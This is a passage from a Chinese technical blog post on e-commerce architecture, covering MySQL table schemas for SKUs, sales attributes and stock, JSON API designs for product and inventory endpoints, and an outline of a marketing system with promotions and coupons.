class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> AUTO_INCREMENT=<span class="number">666666</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'sku表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 销售属性表 product_attr</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_attr`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性描述'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'销售属性表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 销售属性值 product_attr_value</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_attr_value`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'销售属性值ID'</span>,</span><br><span class="line">    <span class="string">`attr_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`value`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值描述'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'销售属性值'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 关联关系冗余表 product_spu_sku_attr_map</span></span><br><span class="line"><span class="comment">-- 1. spu下 有哪些sku</span></span><br><span class="line"><span class="comment">-- 2. spu下 有那些销售属性</span></span><br><span class="line"><span class="comment">-- 3. spu下 每个销售属性对应的销售属性值(一对多)</span></span><br><span class="line"><span class="comment">-- 4. spu下 每个销售属性值对应的sku(一对多)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_spu_sku_attr_map`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`spu_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`sku_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`attr_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`attr_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性名称'</span>,</span><br><span class="line">    <span class="string">`attr_value_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值ID'</span>,</span><br><span class="line">    <span class="string">`attr_value_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'关联关系冗余表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sku库存表 product_sku_stock</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_sku_stock`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`sku_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`quantity`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'库存'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'sku库存表'</span>;</span><br></pre></td></tr></table></figure><h3 id="接口设计-1"><a href="#接口设计-1" class="headerlink" title="接口设计"></a>接口设计</h3><p>关于接口设计目前很简单，无非列表和详情。但是这里我做了一个很好的设计<strong>动静分离</strong>，例如库存的动态的数据，单独提供接口，其他列表和详情数据完全静态化，把流量打到CDN去，这里又会说到我们下步计划的基础服务体系里的「静态资源服务」，这个服务的主要功能就是把我们的接口数据静态化。具体的<strong>V1.0</strong>版的接口设计如下：</p><p>1、spu详情 GET {version}/product/spu/{spu_id}</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>spu_id</td><td>number</td><td>yes</td><td>spu ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"brand_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, 品牌ID"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 品牌名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, 品牌描述"</span>,</span><br><span class="line">            <span class="attr">"logo_url"</span>: <span class="string">"string, 品牌logo图片"</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"category_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, 分类ID"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 品牌名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, 品牌描述"</span>,</span><br><span class="line">            <span class="attr">"pic_url"</span>: <span class="string">"string, 分类图片"</span>,</span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"string, 分类地址&#123;pid&#125;-&#123;child_id&#125;-..."</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"spu_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, spu id"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, spu名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, spu描述"</span>,</span><br><span class="line">            <span class="attr">"selling_point"</span>: <span class="string">"string, 卖点"</span>,</span><br><span class="line">            <span class="attr">"unit"</span>: <span class="string">"string, spu单位"</span>,</span><br><span class="line">            <span class="attr">"banner_url"</span>: [</span><br><span class="line">                <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"main_url"</span>: [</span><br><span class="line">                <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">                <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">            <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">            <span class="attr">"attrs"</span>: [ // 有那些销售属性</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"销售属性ID"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"string, 销售属性名称"</span>,</span><br><span class="line">                    <span class="attr">"desc"</span>: <span class="string">"string, 销售属性描述"</span>,</span><br><span class="line">                    <span class="attr">"values"</span>: [ // 每个销售属性对应的销售属性值(一对多)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"id"</span>: <span class="string">"销售属性值ID"</span>,</span><br><span class="line">                            <span class="attr">"name"</span>: <span class="string">"string, 销售属性值"</span>,</span><br><span class="line">                            <span class="attr">"desc"</span>: <span class="string">"string, 销售属性值描述"</span>,</span><br><span class="line">                            // 每个销售属性值对应的sku(一对多)</span><br><span class="line">                            // 页面初始化时，按钮不可点击逻辑判断： 如果该销售属性值下所有sku没有库存，则该销售属性按钮不可点击</span><br><span class="line">                            // 选择销售属性值时，按钮不可点击逻辑判断：销售属性构成双向链表，每个销售属性又是一个单向链表存改销售属性对应的所有销售属性值。每当选择一个销售属性值时先前和后一个销售属性遍历，执销售属性值下所有sku售罄的按钮不可点击，且当前销售属性值map记录key为当前点击的销售属性值ID，值统一标示一下就行，目的记录是由于选择了哪个销售属性值使得当前的销售属性值为售罄状态</span><br><span class="line">                            // 取消选择销售属性值时，按钮不可点击逻辑恢复判断：数据结构同上，遍历，记录的map删除key为当前取消选中的销售属性值，并判断是否还有别的key使得该销售属性值为售罄状态，如果没有则恢复未售罄状态</span><br><span class="line">                            "skus": [</span><br><span class="line">                                "number, sku id",</span><br><span class="line">                                "number, sku id",</span><br><span class="line">                            ],</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            "skus": [ // 有哪些sku</span><br><span class="line">                "number, sku id",</span><br><span class="line">                "number, sku id",</span><br><span class="line">            ],</span><br><span class="line">            "skus_map": &#123;</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、获取spu下所有skus库存 GET {version}/stock/spu/{spu_id}</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>spu_id</td><td>number</td><td>yes</td><td>spu ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">            <span class="attr">"skus_stock"</span>: &#123;</span><br><span class="line">                <span class="attr">"int, sku id"</span>: &#123;</span><br><span class="line">                    <span class="attr">"quantity"</span>: <span class="string">"int, 剩余库存数量"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、sku详情 GET {version}/product/sku/{sku_id}</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>sku</td><td>number</td><td>yes</td><td>sku ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"number, sku id"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"string, sku名称"</span>,</span><br><span class="line">        <span class="attr">"desc"</span>: <span class="string">"string, sku描述"</span>,</span><br><span class="line">        <span class="attr">"unit"</span>: <span class="string">"string, sku单位"</span>,</span><br><span class="line">        <span class="attr">"banner_url"</span>: [</span><br><span class="line">            <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">            <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"main_url"</span>: [</span><br><span class="line">            <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">            <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">        <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、spu列表 GET {version}/product/spu/list</p><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"list"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"number, spu id"</span>,</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"string, spu名称"</span>,</span><br><span class="line">                <span class="attr">"desc"</span>: <span class="string">"string, spu描述"</span>,</span><br><span class="line">                <span class="attr">"unit"</span>: <span class="string">"string, spu单位"</span>,</span><br><span class="line">                <span class="attr">"banner_url"</span>: [</span><br><span class="line">                    <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                    <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">                <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="营销体系"><a href="#营销体系" class="headerlink" title="营销体系"></a>营销体系</h1><p>营销体系在一个电商系统中承担着尖刀般的作用，为电商团队拼下无数订单，就如同现实生活中的一线销售人员，引流、促销、提高成单率和客单价。</p><p>一个营销体系拥有各种提升GMV的手段，并且仍然在不断的推陈出新，着实令人敬佩。</p><h2 id="营销体系拆分"><a href="#营销体系拆分" class="headerlink" title="营销体系拆分"></a>营销体系拆分</h2><p>按照不同的维度，我们把营销体系划分为两大系统：</p><table><thead><tr><th>系统</th><th>描述</th><th>维度</th></tr></thead><tbody><tr><td>活动营销系统</td><td>拥有各种手段<strong>提升PV\UV</strong>，并引导消费</td><td>PV、UV维度</td></tr><tr><td>销售营销系统</td><td>拥有各种<strong>降低或变相降低价格</strong>的手段，来促进消费</td><td>价格维度</td></tr></tbody></table><ul><li>活动营销系统：<ul><li>抽奖<ul><li>按时间抽奖</li><li>按当前活动参与次数抽奖</li><li>按数额区间抽奖</li></ul></li><li>活动模板</li><li>抢购？？？</li></ul></li><li>销售营销系统：<ul><li>满减</li><li>满赠</li><li>买送</li><li>限时购(限时降价或限时折扣)</li><li>秒杀</li><li>加价购</li><li>多买</li><li>预售<ul><li>全款预售</li><li>定金(订金)膨胀预售</li><li>盲售</li></ul></li><li>拼团</li><li>砍价</li><li>众筹</li><li>组合套装</li></ul></li><li>营销体系的基础服务支撑:<ul><li>优惠券服务<ul><li>满减券</li><li>折扣券</li><li>现金券</li></ul></li><li>积分服务</li></ul></li></ul><h2 id="概念定义"><a href="#概念定义" class="headerlink" 